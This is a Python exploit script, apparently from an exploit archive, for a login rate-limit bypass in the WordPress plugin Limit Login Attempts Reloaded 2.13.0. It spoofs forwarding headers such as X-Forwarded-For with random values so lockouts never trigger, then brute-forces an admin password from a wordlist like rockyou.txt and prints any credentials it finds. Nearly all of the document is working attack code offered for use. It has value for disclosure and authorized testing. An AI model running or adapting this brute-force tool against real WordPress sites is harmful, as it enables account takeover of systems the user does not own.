#!/usr/bin/python3

"""
Exploit Title: WordPress Plugin Limit Login Attempts Reloaded 2.13.0 - Login Limit Bypass
Date: 2020-06-09
Exploit Author: N4nj0
Software Link: https://wordpress.org/plugins/limit-login-attempts-reloaded
Version: 2.13.0
Tested on: WordPress 5.4.1, 5.4.2

The plugin's primary goal is to limit the rate at which an individual can attempt
to authenticate with WordPress. Plugin has support for HTTP headers X_FORWARDED_FOR
and X_SUCURI_CLIENTIP to allow rate limiting for users when web servers are behind
a load balancer or reverse proxy service.
However, the header is not validated, and any random string can bypass the rate check.
It is also possible to forge custom header in the plugin configuration settings page.

Balanced origin headers to test can be:
HTTP request header name: X-Forwarded-For;     Plugin settings value name: HTTP_X_FORWARDED_FOR
HTTP request header name: CF-Connecting-IP;    Plugin settings value name: HTTP_CF_CONNECTING_IP
HTTP request header name: X-Sucuri-ClientIP;   Plugin settings value name: HTTP_X_SUCURI_CLIENTIP
HTTP request header name: Client-IP;           Plugin settings value name: HTTP_CLIENT_IP
HTTP request header name: X-Client-IP;         Plugin settings value name: HTTP_X_CLIENT_IP
HTTP request header name: X-Real-IP;           Plugin settings value name: HTTP_X_REAL_IP
HTTP request header name: X-Cluster-Client-IP; Plugin settings value name: HTTP_X_CLUSTER_CLIENT_IP
HTTP request header name: Pragma;              Plugin settings value name: HTTP_PRAGMA
HTTP request header name: Xonnection;          Plugin settings value name: HTTP_XONNECTION
HTTP request header name: Cache-Info;          Plugin settings value name: HTTP_CACHE_INFO
HTTP request header name: Xproxy;              Plugin settings value name: HTTP_XPROXY
HTTP request header name: Proxy-Connection;    Plugin settings value name: HTTP_PROXY_CONNECTION
HTTP request header name: Via;                 Plugin settings value name: HTTP_VIA
HTTP request header name: X-Coming-From;       Plugin settings value name: HTTP_X_COMING_FROM
HTTP request header name: X-Forwarded;         Plugin settings value name: HTTP_X_FORWARDED
HTTP request header name: Coming-From;         Plugin settings value name: HTTP_COMING_FROM
HTTP request header name: Forwarded-For;       Plugin settings value name: HTTP_FORWARDED_FOR
HTTP request header name: Forwarded;           Plugin settings value name: HTTP_FORWARDED

Custom headers are allowed using the following format, as an example:
HTTP request header name: X-Pippo;             Plugin settings value name: HTTP_X_PIPPO
"""

import argparse
import os
import requests
import string, random # Used for random string.
from sys import argv
from urllib.parse import urlparse


def getArguments():
    # Get command-line arguments.
    examples = """examples:
  check:   ./wp-brute.py -c -u http://wordpress -H X-Forwarded-For -l admin -P /usr/share/wordlists/rockyou.txt
           ./wp-brute.py --check --url http://wordpress --header X-Forwarded-For --login admin --passwordlist /usr/share/wordlists/rockyou.txt --quiet

  exploit: ./wp-brute.py -e -u http://wordpress -H X-Forwarded-For -l admin -P /usr/share/wordlists/rockyou.txt -q
           ./wp-brute.py --exploit --url http://wordpress --header X-Forwarded-For --login admin --passwordlist /usr/share/wordlists/rockyou.txt --quiet
"""

    parser = argparse.ArgumentParser(description='WordPress Plugin Limit Login Attempts Reloaded 2.13.0 - Login Limit Bypass', epilog=examples, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-u', '--url', help='WordPress base URL.', required=True)
    parser.add_argument('-H', '--header', help='HTTP Request Header.', required=True)
    parser.add_argument('-l', '--login', help='Single username for login.', required=True)
    parser.add_argument('-P', '--passwordlist', help='Password list for login.', required=True)
    parser.add_argument('-q', '--quiet', help='Enable quiet mode.', action='store_true')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-c', '--check', help='Check if the version is vulnerable. Specify the header to test for rate bypass.', action='store_true')
    group.add_argument('-e', '--exploit', help='Exploit the vulnerable plugin. Specify the header for rate bypass.', action='store_true')
    args = parser.parse_args()

    # Basic checks of user input.
    # Check variable passwordlist.
    if args.passwordlist is not None:
        if not os.path.exists(args.passwordlist):
            print('Error: Check your password list. File is not on a valid path.')
            exit()
    # Check variable URL.
    if args.url is not None:
        resultUrl = urlparse(args.url)
        isValid = all([resultUrl.scheme, resultUrl.netloc])
        if not isValid:
            print('Error: Check WordPress base URL.')
            exit()

    # Returns a list.
    return args


def login(wpBaseURL, originHeader, username, password):
    # Preparing random string. Length of 15 is not required.
    randString = ''.join(random.sample(string.ascii_lowercase, 15))

    # Preparing login request.
    adminURL = wpBaseURL + "/wp-admin/"
    url = wpBaseURL + "/wp-login.php"
    cookies = {"wordpress_test_cookie": "WP+Cookie+check"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Accept-Encoding": "gzip, deflate",
               "Content-Type": "application/x-www-form-urlencoded",
               originHeader: randString,
               "Connection": "close",
               "Upgrade-Insecure-Requests": "1"
    }
    data = {"log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": adminURL,
            "testcookie": "1"
    }
    r = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)

    # Validating the result.
    failPassNoPlugin = "The password you entered for the username <strong>" + username + "</strong> is incorrect"
    failPassPlugin = "Incorrect username or password."
    failPassPluginBlocking = "Too many failed login attempts."
    if r.status_code == 200 and failPassNoPlugin in r.text:
        # Code 0: Plugin seems to be not installed, or the source IP or username is in whitelist.
        return 0
    if r.status_code == 200 and failPassPlugin in r.text:
        # Code 2: Plugin seems to be present and active. It is possible to test.
        return 2
    if r.status_code == 200 and failPassPluginBlocking in r.text:
        # Code 3: Plugin is present and blocking the current IP.
        # Wait for lockout and try with another HTTP header.
        return 3
    if r.status_code == 302 and r.headers['Location'] == adminURL:
        # Code 1: Login is successful. Credentials found.
        return 1
    # Code -1: Unhandled error. Check the response page.
    return -1


def main():
    # Get script arguments.
    args = getArguments()
    wpBaseURL = args.url                              # http://wordpress
    originHeader = args.header                        # X-Forwarded-For
    username = args.login                             # admin
    passwordList = os.path.abspath(args.passwordlist) # /path/to/wordlist/passwords.txt
    quiet = True if args.quiet else False
    if quiet: print('[+] Quiet mode is enabled.')
    mode = 'exploit' if args.exploit else 'check'     # check or exploit

    try:
        with open(passwordList, 'rb') as f:
            # Adding .decode() because the file is opened in binary mode.
            #lines = [l for l in (line.strip().decode() for line in f) if l]
            lines = [l for l in (line.strip() for line in f) if l]
    except:
        print('Error: Check your input file.')
        exit()

    # Check mode configuration. Testing 10 times to see if lockout is triggered.
    probe = 10
    if mode == 'check':
        count = 0
        for password in lines[:probe]:
            password = password.decode()
            result = login(wpBaseURL, originHeader, username, password)
            if result == 0:
                print('[+] Plugin seems to be not installed, or the source IP or username is in whitelist.')
                exit()
            elif result == 1:
                print('[+] Found user ' + username + ':' + password + '.')
                exit()
            elif result == 2:
                if not quiet: print('[*] Plugin seems to be present. Testing for header: ' + originHeader + '. Incorrect user ' + username + ':' + password + '.')
                count += 1
            elif result == 3:
                break
            else:
                print('[-] Error: Check the login request response.')
                exit()

        if count == probe:
            print('[+] Plugin seems to be present.')
            print('[+] Rate limit seems not applied for ' + str(count) + ' attempts.')
            print('[+] Exploit with header: ' + originHeader + '.')
        elif count < probe:
            print('[-] Too many failed login attempts.')
            print('[-] Target seems to be not vulnerable.')
            print('[-] Try with another HTTP header, after the lockout period.')
        else:
            print('[-] Unknown error. Check the response. ')


    if mode == 'exploit':
        for password in lines:
            password = password.decode()
            result = login(wpBaseURL, originHeader, username, password)
            if result == 0:
                if not quiet: print('[*] Incorrect user ' + username + ':' + password)
                pass
            elif result == 1:
                print('[+] Found user ' + username + ':' + password)
                exit()
            elif result == 2:
                if not quiet: print('[*] Incorrect user ' + username + ':' + password + '. Threshold is met.')
                pass
            elif result == 3:
                if not quiet: print('[*] Incorrect user ' + username + ':' + password)
                print('[-] Too many failed login attempts.')
                print('[-] Target seems to be not vulnerable.')
                print('[-] Try with another HTTP header, after the lockout period.')
                exit()
            else:
                print('[-] Error: Check the login request response.')
                exit()


# Main function. Used for not let run this script if imported as a module.
if __name__ == '__main__':
    main()

